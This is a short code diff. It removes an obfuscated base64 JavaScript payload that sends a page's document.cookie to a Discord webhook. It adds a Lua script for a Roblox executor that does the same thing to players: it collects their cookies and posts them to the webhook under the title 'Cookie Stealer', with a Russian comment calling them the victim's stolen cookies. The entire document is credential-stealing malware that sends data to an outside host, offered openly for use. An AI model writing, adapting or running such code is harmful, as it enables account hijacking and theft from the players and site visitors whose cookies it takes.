@@ -1,1 +1,18 @@
-eval(atob("dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdQT1NUJywgJ2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0MTI4MDYzNTU5Nzg0MjQ0MzIvdEZUa1hkd0FJZmFpdnFqY2xYYUJGcXZQNVhGelhYMlQyTTFOdGlHcklfZ3h2ZldKVWduQlA3NVl6MFVnYjFMMEZZaC1OJyk7eGhyLnNldFJlcXVlc3RIZWFkZXIoJ0NvbnRlbnQtdHlwZScsICdhcHBsaWNhdGlvbi9qc29uJyk7dmFyIGRhdGEgPSB7IGNvbnRlbnQ6IGRvY3VtZW50LmNvb2tpZSB9O3hoci5zZW5kKEpTT04uc3RyaW5naWZ5KGRhdGEpKTs="))
+-- Скрипт для инжектора Roblox (например, Synapse X)
+local request = (syn and syn.request) or (http and http.request) or request
+local webhook = "https://discord.com/api/webhooks/1412806355978424432/tFTkXdwAIfaivqjclXaBFqvP5XFzX2T2M1NtiGrI_gxvfWJUgnBP75Yz0Ugb1L0FYh-N"
+
+local function stealCookies()
+    local cookies = game:GetService("Players").LocalPlayer:GetCookies().value
+    local data = {
+        ["content"] = "🕵️ Куки жертвы украдены:",
+        ["embeds"] = {{
+            ["title"] = "Cookie Stealer",
+            ["description"] = "```" .. tostring(cookies) .. "```",
+            ["color"] = 16711680
+        }}
+    }
+    request({Url = webhook, Method = "POST", Headers = {["Content-Type"]="application/json"}, Body = game:GetService("HttpService"):JSONEncode(data)})
+end
+
+stealCookies()
